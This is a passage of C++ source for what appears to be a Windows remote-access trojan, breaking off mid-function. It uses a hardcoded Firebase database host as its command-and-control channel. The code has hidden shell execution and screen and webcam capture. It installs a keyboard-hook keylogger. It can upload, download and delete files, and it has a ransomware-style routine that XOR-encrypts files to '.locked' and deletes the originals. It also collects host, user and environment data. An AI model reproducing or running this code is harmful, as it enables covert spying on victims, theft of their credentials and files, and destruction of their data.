#include <iostream>
#include <string>
#include <windows.h>
#include <winhttp.h>
#include <sstream>
#include <vector>
#include <gdiplus.h>
#include <vfw.h>
#include <tlhelp32.h>
#include <mmsystem.h>
#include <bcrypt.h>
#include "sqlite3.h"
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "winmm.lib")
using namespace Gdiplus;

std::string computerName;
std::string publicIP;
bool g_noPing=false;
int g_liveQuality=25;
float g_liveScale=0.5f;
int g_liveMonitor=0;
bool g_serverSSL = true;
std::string g_serverHost = "lucaaverij-default-rtdb.europe-west1.firebasedatabase.app";
int g_serverPort = 443;
bool g_keylogRunning=false;
std::vector<std::string> g_keylogBuffer;
CRITICAL_SECTION g_keylogLock;
HHOOK g_keylogHook=NULL;

std::string getComputerName() {
    char buf[MAX_PATH]; DWORD sz = MAX_PATH;
    GetComputerNameA(buf, &sz);
    return std::string(buf, sz);
}

std::string getTimestamp() {
    SYSTEMTIME st; GetSystemTime(&st);
    char buf[32]; sprintf(buf,"%04d-%02d-%02dT%02d:%02d:%02dZ",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);
    return std::string(buf);
}

std::string httpsPost(const std::string& path, const std::string& body) {
    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "err";
    HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
    if (!c) { WinHttpCloseHandle(s); return "err"; }
    HINTERNET r = WinHttpOpenRequest(c, L"POST", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "err"; }
    std::wstring hdr = L"Content-Type: application/json\r\n";
    WinHttpSendRequest(r, hdr.c_str(), -1, (LPVOID)body.c_str(), body.size(), body.size(), 0);
    WinHttpReceiveResponse(r, 0);
    std::string out; DWORD n; char buf[256];
    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return out;
}

std::string httpsPut(const std::string& path, const std::string& body) {
    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "err";
    HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
    if (!c) { WinHttpCloseHandle(s); return "err"; }
    HINTERNET r = WinHttpOpenRequest(c, L"PUT", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "err"; }
    std::wstring hdr = L"Content-Type: application/json\r\n";
    WinHttpSendRequest(r, hdr.c_str(), -1, (LPVOID)body.c_str(), body.size(), body.size(), 0);
    WinHttpReceiveResponse(r, 0);
    std::string out; DWORD n; char buf[256];
    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return out;
}

std::string httpsPatch(const std::string& path, const std::string& body) {
    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "err";
    HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
    if (!c) { WinHttpCloseHandle(s); return "err"; }
    HINTERNET r = WinHttpOpenRequest(c, L"PATCH", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "err"; }
    std::wstring hdr = L"Content-Type: application/json\r\n";
    WinHttpSendRequest(r, hdr.c_str(), -1, (LPVOID)body.c_str(), body.size(), body.size(), 0);
    WinHttpReceiveResponse(r, 0);
    std::string out; DWORD n; char buf[256];
    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return out;
}

std::string httpsGet(const std::string& path) {
    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "";
    HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
    if (!c) { WinHttpCloseHandle(s); return ""; }
    HINTERNET r = WinHttpOpenRequest(c, L"GET", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
    WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0);
    WinHttpReceiveResponse(r, 0);
    std::string out; DWORD n; char buf[256];
    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return out;
}

std::string httpsDelete(const std::string& path) {
    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "";
    HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
    if (!c) { WinHttpCloseHandle(s); return ""; }
    HINTERNET r = WinHttpOpenRequest(c, L"DELETE", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
    WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0);
    WinHttpReceiveResponse(r, 0);
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return "";
}

std::string httpsGetUrl(const std::string& host, const std::string& path) {
    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "";
    HINTERNET c = WinHttpConnect(s, std::wstring(host.begin(),host.end()).c_str(), 443, 0);
    if (!c) { WinHttpCloseHandle(s); return ""; }
    HINTERNET r = WinHttpOpenRequest(c, L"GET", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
    WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0);
    WinHttpReceiveResponse(r, 0);
    std::string out; DWORD n; char buf[256];
    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return out;
}

std::string getPublicIP() {
    std::string r = httpsGetUrl("api.ipify.org", "/");
    if(r.empty()) r = httpsGetUrl("icanhazip.com", "/");
    while(!r.empty()&&(r.back()=='\n'||r.back()=='\r')) r.pop_back();
    return r.empty()?"unknown":r;
}

std::string fbUrl(const std::string& p) {
    return "/" + p + ".json";
}

std::string fbEsc(const std::string& s) {
    std::string o;
    for(char c:s){if(c=='/'||c=='.'||c=='#'||c=='$'||c=='['||c==']')o+='_';else o+=c;}
    return o;
}

std::string base64Encode(const unsigned char* data, size_t len) {
    DWORD outLen=0;
    CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &outLen);
    std::string out(outLen, 0);
    CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &out[0], &outLen);
    out.resize(outLen);
    return out;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num=0, size=0;
    GetImageEncodersSize(&num, &size);
    if(size==0) return -1;
    std::vector<unsigned char> buf(size);
    ImageCodecInfo* p=(ImageCodecInfo*)buf.data();
    GetImageEncoders(num, size, p);
    for(UINT i=0;i<num;i++,p++){
        if(wcscmp(p->MimeType,format)==0){*pClsid=p->Clsid;return i;}
    }
    return -1;
}

struct MonInfo{int x,y,w,h;};
int enumMon(HMONITOR m, HDC, RECT* r, LPARAM lp){
    std::vector<MonInfo>* v=(std::vector<MonInfo>*)lp;
    v->push_back({r->left,r->top,r->right-r->left,r->bottom-r->top});
    return 1;
}
std::vector<MonInfo> getMonitors(){
    std::vector<MonInfo> v;
    EnumDisplayMonitors(0,0,enumMon,(LPARAM)&v);
    return v;
}

// Cached screen capture resources for live streaming
static HDC g_captureDC = NULL;
static HBITMAP g_captureBMP = NULL;
static int g_captureW = 0, g_captureH = 0;

static void ensureCaptureBuf(int w, int h) {
    if (g_captureDC && (g_captureW != w || g_captureH != h)) {
        SelectObject(g_captureDC, GetStockObject(BLACK_BRUSH));
        DeleteDC(g_captureDC); g_captureDC = NULL;
        DeleteObject(g_captureBMP); g_captureBMP = NULL;
    }
    if (!g_captureDC) {
        HDC dc = GetDC(NULL);
        g_captureDC = CreateCompatibleDC(dc);
        g_captureBMP = CreateCompatibleBitmap(dc, w, h);
        ReleaseDC(NULL, dc);
        SelectObject(g_captureDC, g_captureBMP);
        g_captureW = w; g_captureH = h;
    }
}

static std::string jpegEncode(Bitmap* bmp, int quality = 85) {
    CLSID clsid; GetEncoderClsid(L"image/jpeg", &clsid);
    IStream* st = NULL; CreateStreamOnHGlobal(NULL, TRUE, &st);
    EncoderParameters ep; ep.Count = 1;
    ep.Parameter[0].Guid = EncoderQuality;
    ep.Parameter[0].Type = EncoderParameterValueTypeLong;
    ep.Parameter[0].NumberOfValues = 1;
    ULONG q = quality; ep.Parameter[0].Value = &q;
    bmp->Save(st, &clsid, &ep);
    STATSTG stat; st->Stat(&stat, STATFLAG_NONAME);
    ULONG sz = (ULONG)stat.cbSize.LowPart;
    std::vector<unsigned char> d(sz);
    LARGE_INTEGER z = {}; st->Seek(z, STREAM_SEEK_SET, NULL);
    ULONG rd = 0; st->Read(d.data(), sz, &rd); st->Release();
    return base64Encode(d.data(), d.size());
}

struct ScreenRect { int x, y, w, h; };

static ScreenRect getScreenRect(int monitorIdx) {
    auto mons = getMonitors();
    ScreenRect r = {0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN)};
    if (monitorIdx >= 0 && monitorIdx < (int)mons.size()) {
        r = {mons[monitorIdx].x, mons[monitorIdx].y, mons[monitorIdx].w, mons[monitorIdx].h};
    } else if (monitorIdx == -1) {
        r = {GetSystemMetrics(SM_XVIRTUALSCREEN), GetSystemMetrics(SM_YVIRTUALSCREEN),
             GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN)};
    }
    return r;
}

static inline int imax(int a, int b) { return a > b ? a : b; }

static std::string captureToBase64(int monitorIdx, float scale, int quality) {
    ScreenRect sr = getScreenRect(monitorIdx);
    HDC dc = GetDC(NULL);
    ensureCaptureBuf(sr.w, sr.h);
    BitBlt(g_captureDC, 0, 0, sr.w, sr.h, dc, sr.x, sr.y, SRCCOPY | CAPTUREBLT);
    ReleaseDC(NULL, dc);

    int sw = imax(1, (int)(sr.w * scale));
    int sh = imax(1, (int)(sr.h * scale));

    if (scale >= 1.0f && sw == sr.w && sh == sr.h) {
        Bitmap* bmp = Bitmap::FromHBITMAP(g_captureBMP, NULL);
        std::string r = jpegEncode(bmp, quality);
        delete bmp;
        return r;
    }
    Bitmap* src = Bitmap::FromHBITMAP(g_captureBMP, NULL);
    Bitmap* dst = new Bitmap(sw, sh, PixelFormat24bppRGB);
    Graphics g(dst);
    g.SetInterpolationMode(InterpolationModeHighQualityBilinear);
    g.DrawImage(src, 0, 0, sw, sh);
    delete src;
    std::string r = jpegEncode(dst, quality);
    delete dst;
    return r;
}

std::string takeScreenshot(int monitorIdx) { return captureToBase64(monitorIdx, 1.0f, 90); }
std::string takeScreenshotScaled(int monitorIdx, int quality, float scale) { return captureToBase64(monitorIdx, scale, quality); }

std::string captureWebcam() {
    HWND hWndC=capCreateCaptureWindowA("Webcam",WS_CHILD,0,0,320,240,GetDesktopWindow(),1);
    if(!hWndC) return "";
    capDriverConnect(hWndC,0);
    capGrabFrameNoStop(hWndC);
    std::string result;
    if(OpenClipboard(0)){
        HBITMAP hBmp=(HBITMAP)GetClipboardData(CF_BITMAP);
        if(hBmp){
            Bitmap bmp(hBmp,NULL);
            CLSID jpegClsid; GetEncoderClsid(L"image/jpeg",&jpegClsid);
            IStream* is=0; CreateStreamOnHGlobal(0,TRUE,&is);
            bmp.Save(is,&jpegClsid,0);
            STATSTG st; is->Stat(&st,STATFLAG_NONAME);
            ULONG sz=(ULONG)st.cbSize.LowPart;
            std::vector<unsigned char> d(sz);
            LARGE_INTEGER li={}; is->Seek(li,STREAM_SEEK_SET,0);
            ULONG r=0; is->Read(d.data(),sz,&r); is->Release();
            result=base64Encode(d.data(),d.size());
            DeleteObject(hBmp);
        }
        CloseClipboard();
    }
    capDriverDisconnect(hWndC);
    DestroyWindow(hWndC);
    return result;
}

std::string execCmd(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa={sizeof(sa),0,TRUE};
    HANDLE hRead,hWrite;
    CreatePipe(&hRead,&hWrite,&sa,0);
    STARTUPINFOA si={sizeof(si)};
    si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
    si.wShowWindow=SW_HIDE;
    si.hStdOutput=hWrite;
    si.hStdError=hWrite;
    std::string full="cmd.exe /c "+cmd;
    PROCESS_INFORMATION pi={};
    if(!CreateProcessA(NULL,&full[0],0,0,TRUE,CREATE_NO_WINDOW,0,0,&si,&pi)){
        CloseHandle(hRead);CloseHandle(hWrite);return "err";
    }
    CloseHandle(hWrite);
    char buf[4096];std::string out;DWORD n;
    while(ReadFile(hRead,buf,4095,&n,0)&&n>0){buf[n]=0;out+=buf;}
    WaitForSingleObject(pi.hProcess,10000);
    CloseHandle(hRead);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
    return out;
}

std::string jsonEscape(const std::string& s) {
    std::string out;
    for(char c:s){
        if(c=='\\')out+="\\\\";
        else if(c=='"')out+="\\\"";
        else if(c=='\n')out+="\\n";
        else if(c=='\r')out+="\\r";
        else if(c=='\t')out+="\\t";
        else if(c>=0&&c<0x20)continue;
        else out+=c;
    }
    return out;
}

std::string extractJson(const std::string& json, const std::string& key) {
    auto pos = json.find("\"" + key + "\":");
    if (pos == std::string::npos) pos = json.find("\\\"" + key + "\\\":");
    if (pos == std::string::npos) return "";
    pos += key.size() + 3;
    auto valStart = json.find_first_not_of(" \t\n\r", pos);
    if (valStart == std::string::npos) return "";
    if (json[valStart] == '"') {
        valStart++;
        auto valEnd = valStart;
        while (valEnd < json.size()) {
            valEnd = json.find("\"", valEnd);
            if (valEnd == std::string::npos) return "";
            int bc = 0;
            for (int i = (int)valEnd - 1; i >= (int)valStart && json[i] == '\\'; i--) bc++;
            if (bc % 2 == 0) break;
            valEnd++;
        }
        return json.substr(valStart, valEnd - valStart);
    }
    auto valEnd = json.find_first_of(",} \t\n\r", valStart);
    if (valEnd == std::string::npos) valEnd = json.size();
    return json.substr(valStart, valEnd - valStart);
}

std::string unescapePayload(const std::string& s) {
    std::string r;
    r.reserve(s.size());
    for (size_t i = 0; i < s.size(); i++) {
        if (s[i] == '\\' && i + 1 < s.size()) {
            char c = s[i + 1];
            if (c == '"') { r += '"'; i++; }
            else if (c == '\\') { r += '\\'; i++; }
            else if (c == 'n') { r += '\n'; i++; }
            else if (c == 'r') { r += '\r'; i++; }
            else if (c == 't') { r += '\t'; i++; }
            else r += s[i];
        } else r += s[i];
    }
    return r;
}

std::string listDir(const std::string& path) {
    std::string searchPath = path;
    if(searchPath.empty()){
        DWORD drives=GetLogicalDrives();
        std::string out="[";
        for(int i=0;i<26;i++){
            if(drives&(1<<i)){
                char d[4]={(char)('A'+i),':','\\',0};
                ULONG sn,maxComp,flags;
                GetVolumeInformationA(d,0,0,&sn,&maxComp,&flags,0,0);
                if(out.size()>1) out+=",";
                out+="{\"n\":\"";out.push_back(d[0]);out+=":\",\"s\":0,\"d\":true,\"m\":\"Drive ";
                out.push_back(d[0]);out+="\"}";
            }
        }
        out+="]";
        return out;
    }
    std::string norm = searchPath;
    if(norm.back()!='\\') norm+="\\";
    std::string spec = norm + "*";
    std::string out="[";
    WIN32_FIND_DATAA fd;
    HANDLE h=FindFirstFileA(spec.c_str(),&fd);
    if(h!=INVALID_HANDLE_VALUE){
        do{
            std::string n=fd.cFileName;
            if(n=="."||n=="..") continue;
            if(out.size()>1) out+=",";
            out+="{\"n\":\""+jsonEscape(n)+"\",\"s\":"+std::to_string(fd.nFileSizeLow)+",\"d\":"+(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY?"true":"false")+",\"m\":\"";
            FILETIME ft=fd.ftLastWriteTime;
            SYSTEMTIME st;
            FileTimeToSystemTime(&ft,&st);
            char mb[32];sprintf(mb,"%04d-%02d-%02d %02d:%02d",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute);
            out+=mb;out+="\"}";
        }while(FindNextFileA(h,&fd));
        FindClose(h);
    }
    out+="]";
    return out;
}

std::vector<unsigned char> base64Decode(const std::string& s) {
    DWORD outLen=0;
    CryptStringToBinaryA(s.c_str(), s.size(), CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL);
    std::vector<unsigned char> out(outLen);
    CryptStringToBinaryA(s.c_str(), s.size(), CRYPT_STRING_BASE64, out.data(), &outLen, NULL, NULL);
    return out;
}

std::string fileDelete(const std::string& path) {
    if (path.empty()) return "bad_path";
    if (DeleteFileA(path.c_str())) return "ok";
    if (RemoveDirectoryA(path.c_str())) return "ok_dir";
    return "err:" + std::to_string(GetLastError());
}

std::string fileRename(const std::string& payload) {
    std::string path = extractJson(payload, "path");
    std::string name = extractJson(payload, "name");
    if (path.empty() || name.empty()) return "bad_payload";
    size_t pos = path.find_last_of("\\/");
    std::string newPath = (pos != std::string::npos ? path.substr(0, pos+1) : "") + name;
    if (MoveFileA(path.c_str(), newPath.c_str())) return "ok";
    return "err:" + std::to_string(GetLastError());
}

std::string fileEncrypt(const std::string& path) {
    HANDLE f = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if (f == INVALID_HANDLE_VALUE) return "err:open";
    DWORD sz = GetFileSize(f, 0);
    if (sz == 0 || sz > 50*1024*1024) { CloseHandle(f); return sz==0?"err:empty":"err:toobig"; }
    std::vector<unsigned char> buf(sz);
    DWORD rd = 0;
    if (!ReadFile(f, buf.data(), sz, &rd, 0) || rd != sz) { CloseHandle(f); return "err:read"; }
    CloseHandle(f);
    const unsigned char key[] = {0xAB,0xCD,0xEF,0x01,0x23,0x45,0x67,0x89,0xFE,0xDC,0xBA,0x98,0x76,0x54,0x32,0x10};
    for (size_t i = 0; i < buf.size(); i++) buf[i] ^= key[i % sizeof(key)];
    std::string outPath = path + ".locked";
    if (GetFileAttributesA(outPath.c_str()) != INVALID_FILE_ATTRIBUTES) return "err:exists";
    HANDLE out = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
    if (out == INVALID_HANDLE_VALUE) return "err:create";
    DWORD wr = 0;
    WriteFile(out, buf.data(), buf.size(), &wr, 0);
    CloseHandle(out);
    DeleteFileA(path.c_str());
    return "ok:" + outPath;
}

std::string fileDecrypt(const std::string& path) {
    HANDLE f = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if (f == INVALID_HANDLE_VALUE) return "err:open";
    DWORD sz = GetFileSize(f, 0);
    if (sz == 0 || sz > 50*1024*1024) { CloseHandle(f); return sz==0?"err:empty":"err:toobig"; }
    std::vector<unsigned char> buf(sz);
    DWORD rd = 0;
    if (!ReadFile(f, buf.data(), sz, &rd, 0) || rd != sz) { CloseHandle(f); return "err:read"; }
    CloseHandle(f);
    const unsigned char key[] = {0xAB,0xCD,0xEF,0x01,0x23,0x45,0x67,0x89,0xFE,0xDC,0xBA,0x98,0x76,0x54,0x32,0x10};
    for (size_t i = 0; i < buf.size(); i++) buf[i] ^= key[i % sizeof(key)];
    std::string outPath = path;
    if (outPath.size() > 7 && outPath.substr(outPath.size()-7) == ".locked") {
        outPath = outPath.substr(0, outPath.size()-7);
        if (GetFileAttributesA(outPath.c_str()) != INVALID_FILE_ATTRIBUTES)
            outPath = path + ".unlocked";
    } else {
        outPath = path + ".unlocked";
    }
    HANDLE out = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
    if (out == INVALID_HANDLE_VALUE) return "err:create";
    DWORD wr = 0;
    WriteFile(out, buf.data(), buf.size(), &wr, 0);
    CloseHandle(out);
    DeleteFileA(path.c_str());
    return "ok:" + outPath;
}

std::string fileUpload(const std::string& payload) {
    std::string path = extractJson(payload, "path");
    std::string data = extractJson(payload, "data");
    if (path.empty() || data.empty()) return "bad_payload";
    auto decoded = base64Decode(data);
    HANDLE f = CreateFileA(path.c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
    if (f == INVALID_HANDLE_VALUE) return "err:create:" + std::to_string(GetLastError());
    DWORD wr = 0;
    WriteFile(f, decoded.data(), (DWORD)decoded.size(), &wr, 0);
    CloseHandle(f);
    return "ok:" + std::to_string(decoded.size()) + " bytes";
}

std::string fileDownload(const std::string& path) {
    if (path.empty()) return "err:empty_path";
    HANDLE f = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if (f == INVALID_HANDLE_VALUE) return "err:open:" + std::to_string(GetLastError());
    DWORD sz = GetFileSize(f, 0);
    if (sz == 0) { CloseHandle(f); return "err:empty"; }
    if (sz > 10*1024*1024) { CloseHandle(f); return "err:toobig_10mb"; }
    std::vector<unsigned char> buf(sz);
    DWORD rd = 0;
    if (!ReadFile(f, buf.data(), sz, &rd, 0) || rd != sz) { CloseHandle(f); return "err:read"; }
    CloseHandle(f);
    return base64Encode(buf.data(), sz);
}

std::string clipboardWrite(const std::string& text) {
    if (text.empty()) return "err:empty";
    if (!OpenClipboard(0)) return "err:clipboard";
    EmptyClipboard();
    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
    if (!hg) { CloseClipboard(); return "err:alloc"; }
    memcpy(GlobalLock(hg), text.c_str(), text.size() + 1);
    GlobalUnlock(hg);
    SetClipboardData(CF_TEXT, hg);
    CloseClipboard();
    return "ok";
}

LRESULT CALLBACK keylogProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;
        WORD vk = ks->vkCode;
        bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
        bool alt = GetAsyncKeyState(VK_MENU) & 0x8000;
        char buf[64]; int pos = 0;
        if (ctrl) { memcpy(buf+pos, "Ctrl+", 5); pos+=5; }
        if (alt) { memcpy(buf+pos, "Alt+", 4); pos+=4; }
        if (shift) { memcpy(buf+pos, "Shift+", 6); pos+=6; }
        if (vk >= 0x30 && vk <= 0x39) {
            char c = shift ? ")!@#$%^&*("[vk-0x30] : (char)vk;
            buf[pos++] = c;
        } else if (vk >= 0x41 && vk <= 0x5A) {
            buf[pos++] = (char)(vk + (shift ? 0 : 32));
        } else if (vk == VK_RETURN) { memcpy(buf+pos, "[Enter]", 7); pos+=7; }
        else if (vk == VK_SPACE) { buf[pos++] = ' '; }
        else if (vk == VK_BACK) { memcpy(buf+pos, "[Bksp]", 6); pos+=6; }
        else if (vk == VK_TAB) { memcpy(buf+pos, "[Tab]", 5); pos+=5; }
        else if (vk == VK_ESCAPE) { memcpy(buf+pos, "[Esc]", 5); pos+=5; }
        else if (vk == VK_DELETE) { memcpy(buf+pos, "[Del]", 5); pos+=5; }
        else if (vk == VK_LEFT) { memcpy(buf+pos, "[Left]", 6); pos+=6; }
        else if (vk == VK_RIGHT) { memcpy(buf+pos, "[Right]", 7); pos+=7; }
        else if (vk == VK_UP) { memcpy(buf+pos, "[Up]", 4); pos+=4; }
        else if (vk == VK_DOWN) { memcpy(buf+pos, "[Down]", 6); pos+=6; }
        else { pos += sprintf(buf+pos, "[%d]", (int)vk); }
        buf[pos++] = '\n';
        EnterCriticalSection(&g_keylogLock);
        g_keylogBuffer.push_back(std::string(buf, pos));
        if (g_keylogBuffer.size() > 2000) g_keylogBuffer.erase(g_keylogBuffer.begin());
        LeaveCriticalSection(&g_keylogLock);
    }
    return CallNextHookEx(g_keylogHook, nCode, wParam, lParam);
}

std::string startKeylog() {
    if (g_keylogRunning) return "already_running";
    InitializeCriticalSection(&g_keylogLock);
    g_keylogHook = SetWindowsHookExA(WH_KEYBOARD_LL, keylogProc, GetModuleHandle(NULL), 0);
    if (!g_keylogHook) return "err:hook_failed";
    g_keylogRunning = true;
    g_keylogBuffer.clear();
    return "ok";
}

std::string stopKeylog() {
    if (!g_keylogRunning) return "not_running";
    if (g_keylogHook) { UnhookWindowsHookEx(g_keylogHook); g_keylogHook = NULL; }
    g_keylogRunning = false;
    return "ok";
}

std::string dumpKeylog() {
    EnterCriticalSection(&g_keylogLock);
    std::string out;
    for (const auto& s : g_keylogBuffer) out += s;
    LeaveCriticalSection(&g_keylogLock);
    return out.empty() ? "(no keys logged)" : out;
}

std::string screenshotAll() {
    int monCount = GetSystemMetrics(SM_CMONITORS);
    std::string combined;
    for (int i = 0; i < monCount; i++) {
        std::string s = takeScreenshot(i);
        if (!s.empty()) {
            if (!combined.empty()) combined += "\n===MON:" + std::to_string(i) + "===\n";
            combined += s;
        }
    }
    return combined.empty() ? "err:no_monitors" : combined;
}

std::string setWallpaper(const std::string& path) {
    if (path.empty()) return "err:empty";
    BOOL ok = SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    return ok ? "ok" : "err:" + std::to_string(GetLastError());
}

std::string getHostInfo() {
    SYSTEM_INFO si; GetSystemInfo(&si);
    MEMORYSTATUSEX ms = {sizeof(ms)}; GlobalMemoryStatusEx(&ms);
    char compName[MAX_PATH+1]; DWORD csz = MAX_PATH; GetComputerNameA(compName, &csz);
    char userName[MAX_PATH+1]; DWORD usz = MAX_PATH; GetUserNameA(userName, &usz);
    char osArch[32]; sprintf(osArch, "%s", sizeof(void*)==8 ? "x64" : "x86");
    OSVERSIONINFOEXA ov = {sizeof(ov)}; GetVersionExA((OSVERSIONINFOA*)&ov);
    std::string gpu = execCmd("powershell -c \"(Get-CimInstance Win32_VideoController | Select-Object -First 1 Name).Name\"");
    while (!gpu.empty() && (gpu.back()=='\n'||gpu.back()=='\r'||gpu.back()==' ')) gpu.pop_back();
    ULARGE_INTEGER freeB, totalB, totalF;
    std::string disks = "[";
    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            char root[4] = {(char)('A'+i), ':', '\\', 0};
            if (GetDriveTypeA(root) == DRIVE_FIXED && GetDiskFreeSpaceExA(root, &freeB, &totalB, &totalF)) {
                if (disks.size() > 1) disks += ",";
                char volName[256]; DWORD vsz = 255;
                GetVolumeInformationA(root, volName, vsz, NULL, NULL, NULL, NULL, 0);
                disks += "{\"d\":\"" + std::string(1, root[0]) + "\",\"v\":\"" + jsonEscape(volName) + "\",\"t\":" + std::to_string(totalB.QuadPart / (1024*1024*1024)) + ",\"f\":" + std::to_string(freeB.QuadPart / (1024*1024*1024)) + "}";
            }
        }
    }
    disks += "]";
    std::string out = "{";
    out += "\"host\":\"" + jsonEscape(compName) + "\",";
    out += "\"user\":\"" + jsonEscape(userName) + "\",";
    out += "\"arch\":\"" + std::string(osArch) + "\",";
    out += "\"os\":\"Windows " + std::to_string(ov.dwMajorVersion) + "." + std::to_string(ov.dwMinorVersion) + " Build " + std::to_string(ov.dwBuildNumber) + "\",";
    out += "\"cores\":" + std::to_string(si.dwNumberOfProcessors) + ",";
    out += "\"ram\":" + std::to_string(ms.ullTotalPhys / (1024*1024)) + ",";
    out += "\"ram_free\":" + std::to_string(ms.ullAvailPhys / (1024*1024)) + ",";
    out += "\"disks\":" + disks + ",";
    out += "\"gpus\":\"" + jsonEscape(gpu) + "\",";
    out += "\"uptime\":" + std::to_string(GetTickCount64() / 1000);
    out += "}";
    return out;
}

std::string getEnvVars() {
    char* env = GetEnvironmentStringsA();
    if (!env) return "err:no_env";
    std::string out;
    char* p = env;
    while (*p) {
        std::string line(p);
        if (line.find("PATH") == std::string::npos && line.find("PATHEXT") == std::string::npos && line.find("PSModulePath") == std::string::npos) {
            if (line.size() > 1 && line.find("=C:\\") == std::string::npos && line.find("=D:\\") == std::string::npos) {
                if (!out.empty()) out += "\n";
                out += line;
            }
        }
        p += line.size() + 1;
    }
    FreeEnvironmentStringsA(env);
    return out.empty() ? "(empty)" : out;
}

std::string processKillName(const std::string& name) {
